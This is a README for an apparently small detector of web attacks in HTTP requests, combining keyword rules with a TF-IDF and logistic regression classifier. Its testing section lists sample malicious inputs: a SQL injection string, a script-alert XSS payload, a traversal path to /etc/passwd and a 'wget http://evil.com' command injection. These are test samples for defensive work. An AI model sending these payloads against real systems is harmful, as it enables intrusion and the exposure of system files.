# 🔐 AI Web Attack Detection System

## 🚀 Project Overview

This project is an **AI-powered web attack detection system** designed to analyze HTTP requests and detect malicious patterns such as:

* SQL Injection
* Cross-Site Scripting (XSS)
* Path Traversal
* Command Injection

The system uses a **hybrid approach (Rule-Based + Machine Learning)** to ensure better accuracy and reduced false positives.

---

## 🎯 Objective

To build a **real-time detection system** that:

* Identifies malicious HTTP requests
* Classifies attack types
* Logs activity for monitoring
* Provides a simple interactive interface

---

## 🧠 System Architecture

```
User Input → Streamlit UI → Detection Engine → Result + Logs
```

Detection Engine:

```
Rule-Based Detection → ML Model → Final Decision
```

---

## 🛠️ Tech Stack

* Python
* Streamlit (UI)
* Scikit-learn (ML Model)
* Pandas (Data Handling)
* Joblib (Model Saving/Loading)

---

## 📂 Project Structure

```
AI_Web_Attack_Detection/
│
├── data/
│   ├── raw/                  # Original dataset
│   ├── processed/            # Cleaned data (optional)
│
├── model/
│   ├── train.py              # Model training script
│   ├── model.pkl             # Saved model
│   ├── vectorizer.pkl        # TF-IDF vectorizer
│
├── core/
│   ├── detector.py           # Main logic (rules + ML)
│   ├── rules.py              # Rule-based detection
│   ├── ml_engine.py          # ML prediction
│
├── app/
│   ├── app.py                # Streamlit app
│
├── logs/
│   ├── request_logs.csv      # Stores history
│
├── requirements.txt
└── README.md
```

---

## 📊 Dataset

We used a **custom curated dataset** instead of large public datasets.

### Why?

* Faster implementation (time constraint)
* Controlled inputs (no unexpected behavior)
* Focus on HTTP-level attacks (not network packets)

### Data Includes:

* Normal requests (GET, POST)
* SQL Injection patterns
* XSS payloads
* Path traversal inputs
* Command injection examples

---

## ⚙️ How It Works

### 1. Rule-Based Detection

* Detects known attack patterns using keywords
* Fast and reliable
* Example:

  * `OR 1=1` → SQL Injection
  * `<script>` → XSS

---

### 2. Machine Learning Model

* TF-IDF vectorization
* Logistic Regression classifier
* Detects suspicious patterns beyond rules

---

### 3. Final Decision Logic

```
If rule matches → Attack
Else → ML prediction
```

---

## 🧪 Testing

### Sample Inputs:

#### ✅ Normal

```
GET /home
```

#### 🚫 SQL Injection

```
admin' OR 1=1--
```

#### 🚫 XSS

```
<script>alert(1)</script>
```

#### 🚫 Path Traversal

```
../../etc/passwd
```

#### 🚫 Command Injection

```
wget http://evil.com
```

---

## 📜 Logging System

* All requests are stored in:

```
logs/request_logs.csv
```

* Logs include:

  * Request
  * Result
  * Attack Type

---

## ⚠️ Challenges Faced

### 1. CSV Parsing Error

* Issue: Commas inside text broke dataset
* Fix: Wrapped text in quotes

---

### 2. Module Import Error

* Issue: `No module named 'core'`
* Fix: Adjusted Python path using `sys.path`

---

### 3. Empty Log File Error

* Issue: File existed but had no columns
* Fix: Initialized file with headers

---

### 4. Duplicate Button Error (Streamlit)

* Issue: Multiple buttons with same ID
* Fix: Removed duplicate button & added unique key

---

### 5. Logging Not Updating

* Issue: Nested button logic
* Fix: Cleaned single-button workflow

---

## 🚀 How to Run the Project

### Step 1: Install Dependencies

```
pip install -r requirements.txt
```

---

### Step 2: Train Model

```
python model/train.py
```

---

### Step 3: Run Application

```
streamlit run app/app.py
```

---

## 🧠 Key Features

* Hybrid detection system (Rule + ML)
* Real-time request analysis
* Attack type classification
* Confidence score
* Logging system
* Interactive UI

---

## 💡 Future Improvements

* Integration with real web servers (Nginx/API)
* Larger real-world datasets
* Deep learning models
* Real-time network monitoring
* Advanced dashboard analytics

---

## 🏆 Conclusion

This project demonstrates how AI can be used to **enhance web security** by detecting malicious inputs in real time.

Even with a lightweight implementation, the system is:

* Scalable
* Modular
* Demo-ready

---

## 👨‍💻 Author Notes

This project was built with a focus on:

* Practical implementation
* Clear architecture
* Fast development under time constraints

---

🔥 *“Not just a project — a system.”*
